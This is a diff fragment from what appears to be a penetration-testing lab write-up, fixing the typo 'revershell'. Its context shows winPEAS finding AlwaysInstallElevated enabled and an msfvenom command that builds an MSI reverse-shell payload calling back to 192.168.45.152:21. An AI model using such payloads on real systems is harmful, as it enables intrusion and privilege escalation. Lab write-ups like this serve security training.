@@ -96,7 +96,7 @@ upload winpeas and found we have AlwaysInstallElevated
     AlwaysInstallElevated set to 1 in HKLM!
     AlwaysInstallElevated set to 1 in HKCU!
 ```
-make a .msi revershell payload
+make a .msi reverse shell payload
 ```console
 $ msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.45.152 LPORT=21 -f msi -o evil.msi
 [-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
